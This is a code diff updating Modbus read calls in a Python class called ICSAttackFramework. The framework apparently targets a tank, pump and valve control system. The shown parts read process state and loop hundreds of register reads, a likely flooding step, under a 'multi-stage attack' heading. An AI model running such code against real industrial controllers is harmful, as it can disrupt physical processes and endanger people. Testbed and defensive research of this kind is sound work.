@@ -24,9 +24,9 @@ class ICSAttackFramework:
 
     def read_state(self):
 
-        level = self.client.read_holding_registers(0,1)
-        pump = self.client.read_coils(0,1)
-        valve = self.client.read_holding_registers(1,1)
+        level = self.client.read_holding_registers(0, count=1)
+        pump = self.client.read_coils(0, count=1)
+        valve = self.client.read_holding_registers(1, count=1)
 
         print("LEVEL:", level.registers[0])
         print("PUMP:", pump.bits[0])
@@ -146,7 +146,7 @@ class ICSAttackFramework:
 
             for i in range(100):
 
-                self.client.read_holding_registers(0,10)
+                self.client.read_holding_registers(0, count=10)
 
     # ------------------------------------------------
     # Combined multi-stage attack
@@ -186,5 +186,5 @@ class ICSAttackFramework:
 
         for i in range(200):
 
-            self.client.read_holding_registers(0,5)
+            self.client.read_holding_registers(0, count=5)
 
